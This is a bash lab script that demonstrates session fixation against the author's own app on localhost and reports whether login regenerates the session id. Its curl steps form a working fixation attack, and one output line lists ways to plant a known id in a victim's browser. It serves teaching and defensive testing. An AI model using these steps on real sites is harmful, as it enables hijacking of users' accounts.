#!/usr/bin/env bash
# Session fixation, reproduced against our own lab app on localhost.
#
# The attack needs no XSS and no network position. It only needs the app to
# keep the same session id across the login boundary. If it does, an id the
# attacker already knows becomes an authenticated session the moment the
# victim signs in.
#
# Run the app twice to see both outcomes:
#   make run-03                                        -> defended
#   make run-03 SESSION_FLAGS=-unsafe-no-regenerate    -> vulnerable
set -uo pipefail

BASE="${BASE:-http://localhost:5557}"

if ! curl -fsS -o /dev/null "$BASE/" 2>/dev/null; then
  echo "앱이 응답하지 않는다: $BASE"
  echo "먼저 띄운다:  make run-03"
  exit 1
fi

jar=$(mktemp)
trap 'rm -f "$jar"' EXIT

echo "1. 공격자가 앱에서 익명 세션 ID를 하나 받는다"
SID=$(curl -sSi "$BASE/" | tr -d '\r' | sed -n 's/^[Ss]et-[Cc]ookie: sid=\([^;]*\).*/\1/p' | head -1)
if [ -z "$SID" ]; then echo "   세션 ID를 못 받았다"; exit 1; fi
echo "   공격자가 아는 ID: ${SID:0:16}…"
echo
echo "   (실제 공격에서는 이 ID를 피해자 브라우저에 심는다."
echo "    링크의 쿼리, 하위 도메인, XSS 등 심는 방법은 여러 가지다.)"
echo

echo "2. 피해자가 '그 ID를 가진 채로' 로그인한다"
curl -sS -o /dev/null -b "sid=$SID" -c "$jar" \
  -d 'username=alice' -d 'password=alice' "$BASE/login"
AFTER=$(sed -n 's/.*[[:space:]]sid[[:space:]]\(.*\)$/\1/p' "$jar" | tail -1)
echo "   로그인 후 피해자가 받은 ID: ${AFTER:0:16}…"
echo

echo "3. 공격자가 처음에 알던 그 ID로 접근해본다"
BODY=$(curl -sS -b "sid=$SID" "$BASE/")
echo
# Detect by a marker that exists only on the authenticated page. Matching on
# prose is unreliable: the logged-out page also talks about being logged in.
if grep -q 'action="/logout"' <<<"$BODY"; then
  USER=$(sed -n 's/.*<tr><td class="m">사용자<\/td><td>\([^<]*\).*/\1/p' <<<"$BODY" | head -1)
  echo "   >>> 뚫렸다. 공격자의 ID가 ${USER:-alice} 로 로그인된 상태다."
  echo "   >>> 로그인 시 세션 ID를 재발급하지 않아서다."
else
  echo "   >>> 막혔다. 공격자의 ID는 여전히 익명이다."
  echo "   >>> 로그인 시 이전 ID를 폐기하고 새 ID를 발급했기 때문이다."
fi
echo
echo "두 ID가 같으면 취약, 다르면 방어:"
echo "   공격자가 아는 ID : ${SID:0:16}…"
echo "   로그인 후 ID     : ${AFTER:0:16}…"
